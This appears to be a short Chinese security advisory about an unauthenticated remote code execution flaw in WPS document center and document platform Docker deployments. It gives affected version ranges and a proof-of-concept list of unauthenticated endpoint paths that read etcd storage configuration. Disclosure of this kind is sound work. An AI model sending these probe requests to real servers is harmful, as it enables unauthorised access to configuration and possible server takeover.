#  WPS 文档中心与文档中台远程代码执行漏洞远程代码执行漏洞  
原创 安全透视镜  网络安全透视镜   2025-07-17 13:55  
  
漏洞描述  
  
WPS 文档中心与文档中台在 Docker 部署模式下存在未授权接口，攻击者无需身份验证即可通过构造特制数据包实现远程代码执行，获取服务器控制权。  
  
影响范围：  
  
影响范围 WPS文档中台版本v6.02205<=version<v7.1.2405受影响  
  
WPS文档中心版本v7.0.2306b<=version<v7.0.2405b受影响  
  
验证方法  
  
  
POC：向未授权接口发送包含恶意命令的 JSON/XML 数据包即可触发漏洞。  
  
  
/open/v6/api/etcd/operate?key=/config/storage&method=get  
  
/open/api/etcd/operate?key=/config/storage&method=get  
  
/mgr/api/etcd/operate?key=/config/storage&method=get  
  
/mgr/api/mq/v1/receive/msg?key=/config/storage&method=get  
  
/open/api/tools/v1/collect/appactivity?key=/config/storage&method=get/mgr/api/tools/v1/collect/appactivity?key=/config/storage&method=get  
  
  
